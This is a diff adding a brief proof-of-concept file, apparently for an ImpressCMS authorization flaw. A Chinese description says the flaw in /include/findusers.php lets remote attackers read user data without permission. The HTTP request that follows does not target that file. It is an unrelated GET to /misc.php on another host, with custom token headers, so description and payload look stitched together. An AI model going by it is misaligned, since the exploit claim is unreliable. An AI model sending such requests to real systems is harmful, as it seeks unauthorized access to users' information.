@@ -1,0 +1,9 @@
+# ImpressCMS 授权问题漏洞
+# ImpressCMS存在授权问题漏洞，该漏洞的存在是由于/include/findusers.php文件中的访问限制不正确。远程攻击者可以绕过实施的安全限制并获取有关应用程序用户的敏感信息。该漏洞允许远程攻击者未经授权访问其他受限功能。
+GET /misc.php?action=showpopups&type=friend&acid=80001632&bid=hd_tag_m8mv258h HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv258h
+RM-PRO-Token: 981d056468191c16e681449c5ff17bf8
+RM-PRO-Time: 1742808450976
+User-Agent: curl/7.83.1
+
